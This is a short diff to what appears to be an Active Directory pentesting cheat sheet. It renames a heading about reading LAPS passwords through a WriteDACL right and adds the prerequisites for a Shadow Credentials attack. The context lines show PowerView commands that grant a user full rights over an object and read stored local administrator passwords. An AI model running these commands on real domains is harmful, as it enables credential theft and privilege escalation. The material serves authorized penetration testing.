@@ -593,7 +593,7 @@ Get-DomainObjectAcl -SamAccountName <TARGET USER> -ResolveGUIDs | ? {$_.Security
 #### GenericWrite - Computer object takeover
 See [Computer object takeover](#Computer-object-Takeover) 
 
-#### GenericAll - Read LAPS password
+#### WriteDACL - Read LAPS password
 ```
 Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All -Verbose
 Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samaccountname, ms-mcs-admpwd
@@ -602,6 +602,9 @@ Get-DomainComputer | Where-Object -Property ms-mcs-admpwd | Select-Object samacc
 ### GenericWrite - Shadow Credentials
 - Write Key Credentials to the `msDS-KeyCredentialLink` attribute. Request TGT and Extract NTLM hash.
 - Possible to use for persistence since password change doesn't affect the attribute
+- Requirements
+   - Domain must have Active Directory Certificate Services and Certificate Authority configured.
+   - Domain must have at least one DC running with Windows Server 2016 that supports PKINIT. 
 
 ### Windows
 #### Add shadow credentials
